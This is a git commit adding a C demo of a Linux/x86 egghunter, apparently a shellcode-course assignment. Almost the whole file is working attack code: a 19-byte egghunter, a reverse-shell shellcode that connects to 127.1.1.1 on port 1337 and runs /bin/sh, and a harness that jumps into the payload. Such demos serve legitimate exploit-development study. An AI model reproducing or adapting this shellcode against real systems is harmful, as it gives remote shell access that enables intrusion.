142053e506b113f260f41cc4533ed1ab78b1d81f
rcesecurity <rcesecurity@users.noreply.github.com>
2014-08-23 12:31:49 +0200

    Create linux_x86_small_egghunter.c

---
+++ assignment-3/linux_x86_small_egghunter.c
@@ -0,0 +1,37 @@
+/* 
+ *  Title:    Small Egghunter Demo - 19 bytes
+ *  Platform: Linux/x86
+ *  Date:     2014-08-23
+ *  Author:   Julien Ahrens (@MrTuxracer)
+ *  Website:  http://www.rcesecurity.com 
+ *
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define EGG "\x90\x4a\x90\x42"
+
+unsigned char egg[] = EGG;
+
+unsigned char egghunter[] = \
+"\x89\xe0\xbb\x90\x4a\x90\x42\x40\x39\x18\x75\xfb\x39\x58\x04\x75\xf6\xff\xe0";
+
+unsigned char shellcode[] = \
+"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+
+main()
+{
+	printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);	
+	
+	char stack[200];
+	printf("Memory location of shellcode: %p\n", stack);
+
+	strcpy(stack, egg);
+	strcpy(stack+4, egg);
+	strcpy(stack+8, shellcode);
+
+	int (*ret)() = (int(*)())egghunter;
+	ret();
+}
